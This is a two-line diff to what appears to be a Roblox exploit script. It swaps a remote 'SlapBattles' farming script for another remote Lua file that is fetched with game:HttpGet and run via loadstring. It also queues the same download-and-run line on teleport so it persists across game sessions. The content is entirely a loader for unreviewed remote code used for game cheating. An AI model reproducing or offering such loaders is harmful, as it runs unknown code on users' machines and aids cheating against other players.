@@ -1,1 +1,2 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/IncognitoScripts/SlapBattles/refs/heads/main/SnowFarm'))()
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/dakshtop/Iem/refs/heads/main/te.lua'))()")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dakshtop/Iem/refs/heads/main/te.lua'))()
